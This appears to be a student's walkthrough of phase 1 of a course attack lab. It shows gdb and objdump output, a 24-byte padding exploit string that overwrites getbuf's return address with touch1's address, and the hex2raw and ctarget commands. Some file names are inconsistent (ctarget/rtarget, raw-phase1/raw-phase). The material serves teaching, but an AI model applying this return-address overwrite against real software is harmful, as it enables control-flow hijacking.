Phase 1 is the easiest of the 5. What you are trying to do is overflow the stack with the exploit string and change the return address of 
getbuf function to the address of touch1 function. You are trying to call the function touch1.

run ctarget executable in gdb and set a breakpoint at getbuf

`b getbuf`

Then disasemble the getbuf function

`disas`

Since the buffer size is a run time constant, we need to look at the disasembled code to figure it out.

```
Dump of assembler code for function getbuf:
=> 0x0000000000401748 <+0>:	    sub    $0x18,%rsp
   0x000000000040174c <+4>:	    mov    %rsp,%rdi
   0x000000000040174f <+7>:	    callq  0x40198a <Gets>
   0x0000000000401754 <+12>:	mov    $0x1,%eax
   0x0000000000401759 <+17>:	add    $0x18,%rsp
   0x000000000040175d <+21>:	retq   
End of assembler dump.
```

If you look at `sub    $0x18,%rsp`, you can see that 24 (0x18) bytes of buffer is allocated for getbuf.

Now you know the buffer size and you need to input 24 bytes of padding followed by the return address of the touch1 address.

To find the address the touch1, you need to get the dissasembled code for ctarget executable.

`objdump -d rtarget > rtarget_dump.txt`

The above command will save the dissasembled code in file rtarget_dump.txt open that file and find the touch1 function.

I found touch1 inside rtarget which looked like

```
0000000000401760 <touch1>:
  401760:	48 83 ec 08          	sub    $0x8,%rsp
  401764:	c7 05 0e 31 20 00 01 	movl   $0x1,0x20310e(%rip)        # 60487c <vlevel>
  40176b:	00 00 00 
  40176e:	bf 78 30 40 00       	mov    $0x403078,%edi
  401773:	e8 98 f4 ff ff       	callq  400c10 <puts@plt>
  401778:	bf 01 00 00 00       	mov    $0x1,%edi
  40177d:	e8 17 05 00 00       	callq  401c99 <validate>
  401782:	bf 00 00 00 00       	mov    $0x0,%edi
  401787:	e8 24 f6 ff ff       	callq  400db0 <exit@plt>
```

So it's address is at `0x401760`

When you write the bytes, you need to consider the byte order. My system is a little-endian so the bytes go in reverse order.

Finally create a text file named phase1.txt which will look like below
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* the first 24 bytes are just padding */
60 17 40 00 00 00 00 00 /* address of touch1 */
```

Now you need to take this file and run it through the program hex2raw, which will generate raw exploit strings

`./hex2raw < phase1.txt > raw-phase1.txt`

Finally, you run the raw file

`./ctarget < raw-phase.txt`

You will get something like below if your solution is right.

```
Cookie: 0x434b4b70 //your cookie will be different
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```